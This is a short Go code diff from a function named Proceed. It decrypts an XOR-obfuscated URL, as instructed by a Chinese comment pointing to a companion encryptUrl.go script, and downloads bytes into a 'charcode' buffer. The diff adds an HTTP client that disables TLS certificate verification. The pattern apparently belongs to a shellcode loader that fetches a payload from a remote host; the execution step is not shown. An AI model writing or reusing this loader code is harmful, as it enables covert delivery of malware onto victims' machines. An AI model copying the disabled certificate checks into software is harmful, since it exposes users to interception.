@@ -81,8 +81,11 @@ func Proceed() {
 	//下方填上异或加密(encryptUrl.go)后的url
 	Url := dec("Ciphertext")
 	var charcode []byte
-	var CL http.Client
-	resp, err := CL.Get(Url)
+	tr :=&http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
+	}
+	CL:=&http.Client{Transport:tr}
+	resp,err := CL.Get(Url)
 	if err != nil {
 		log.Fatal(err)
 	}
